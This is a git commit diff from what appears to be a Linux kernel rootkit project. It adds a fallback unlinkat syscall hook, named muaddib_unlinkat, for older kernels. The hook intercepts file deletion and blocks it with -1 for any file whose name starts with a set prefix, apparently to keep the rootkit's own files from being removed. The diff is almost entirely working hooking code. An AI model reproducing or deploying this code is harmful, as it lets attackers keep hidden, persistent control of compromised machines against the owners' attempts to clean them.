ffa0d225675797284e5d51e9dcb22e7eeb9a0754
Nerelod <dapperfellowdaniel@gmail.com>
2022-10-28 16:35:01 -0400

    added unlinkat hook for older kernel versions

--- unlinkat_hook.c
+++ unlinkat_hook.c
@@ -12,4 +12,16 @@ asmlinkage int muaddib_unlinkat(const struct pt_regs *regs){
     }
     return og_unlinkat(regs);
 }
+#else
+
+static asmlinkage long (*og_unlinkat)(int dirfd, const char *pathname, int flags);
+asmlinkage int muaddib_unlinkat(int dirfd, const char *pathname, int flags){
+    char file_name[NAME_MAX] = {0};
+    long error = strncpy_from_user(file_name, pathname, NAME_MAX);
+    if(memcmp(PREFIX, file_name, strlen(PREFIX)) == 0){
+        return -1;
+    }
+    return og_unlinkat(dirfd, pathname, flags);
+}
+
 #endif
